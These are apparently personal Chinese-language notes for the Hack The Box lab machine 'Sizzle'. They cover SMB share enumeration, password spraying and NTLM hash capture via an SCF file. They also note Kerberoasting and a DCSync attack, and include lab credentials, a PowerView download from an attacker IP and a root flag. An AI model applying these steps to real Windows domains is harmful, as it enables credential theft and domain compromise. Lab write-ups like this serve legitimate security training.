21端口 匿名登录成功 但无回显
53 dns
80 http iis 10.0 TRACE方法
135 rpc端口
139 445 smb端口
389 ldap端口 663 ssl/ldap
443 https
593 ncacn_http
5985 winrm

21 ftp 无数据
80 443 端口 无明显信息
smb端口尝试

domain：HTB.LOCAL
列出共享文件夹
Department Shares共享文件夹 
发现一堆username
当发现一堆users之后的做法
密码喷洒 发现一个有效的username
amanda_adm 有效用户名

ldap枚举失败 无有效密码

自制字典 密码喷洒？
绑定host 查看web

本地挂载共享
递归访问
寻找可写目录

scf文件存放到smb可写目录 获得NTLM Hash
尝试离线破解

smbmap -H 10.10.10.103 -u amanda -p Ashare1972
在获取得了一组有效凭据后 检查是否有别的可读共享
evil-winrm 尝试登录
ldapdomaindump 枚举信息
web尝试撞库


SMB 共享中的可写目录允许窃取 NTLM 哈希，
破解这些哈希可访问证书服务门户。
可以使用 CA 创建自签名证书并将其用于 PSRemoting

sudo mount -t cifs "//10.10.10.103/Department Shares" /mnt


openssl genrsa -aes256 -out amanda.key 2048
openssl req -new -key amanda.key -out amanda.csr
对amanda.csr进行签名

iwr -uri http://10.10.16.9/PowerView.ps1 -outfile PowerView.ps1

关键字
Sizzle


总结
smb可写目录 捕获NTLM v2 Hash
获得初始shell
Kerberoasting获取第二个用户shell

然后运行bloodhound 寻找提权路径
该用户具有GetChanges和GetChangesAll权限
可以进行DCSync攻击 

导出数据后 
crackmapexec进行Hash碰撞
wmiexec横向



root
646873da6599e741dcbe85150d427e01